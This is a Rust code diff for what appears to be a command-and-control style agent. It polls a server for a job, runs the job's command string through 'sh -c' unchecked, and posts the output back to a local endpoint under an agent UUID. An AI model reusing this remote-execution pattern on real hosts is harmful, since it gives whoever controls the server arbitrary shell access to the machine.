@@ -1,9 +1,43 @@
 use reqwest::{Client, Error};
-//use serde::Serialize;
+use serde::{Deserialize, Serialize};
 use serde_json::json;
 use std::fs::File;
 use std::io::{prelude::*, Read};
+use std::process::Command;
 use uuid::Uuid;
+
+#[derive(Debug, Deserialize)]
+struct Job {
+    agent_uuid: String,
+    command: String,
+}
+
+#[derive(Debug, Serialize)]
+struct JobOutput {
+    agent_uuid: String,
+    output: String,
+}
+
+fn run_command(job: Job) -> String {
+    let output = Command::new("sh").arg("-c").arg(job.command).output();
+
+    match output {
+        Ok(output) => {
+            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+
+            if !output.status.success() {
+                format!(
+                    "Command failed with status: {}\nStderr: {}",
+                    output.status, stderr
+                )
+            } else {
+                stdout
+            }
+        }
+        Err(e) => format!("Error executing command: {}", e),
+    }
+}
 
 #[tokio::main]
 async fn main() -> Result<(), Error> {
@@ -65,8 +99,22 @@ async fn main() -> Result<(), Error> {
             .await?
             .text()
             .await?;
-
-        println!("text: {cmd_to_run:?}");
+        let job: Job = serde_json::from_str(&cmd_to_run).unwrap();
+        //println!("{:?}", job);
+        let output = run_command(job);
+        println!("{}", output);
+        let job_output = JobOutput {
+            agent_uuid: uuid,
+            output: output,
+        };
+        let send_output_status = client
+            .post("https://127.0.0.1:3031/job_output")
+            .json(&job_output)
+            .send()
+            .await?
+            .text()
+            .await?;
+        println!("Send output status: {}", send_output_status);
         break;
     }
 
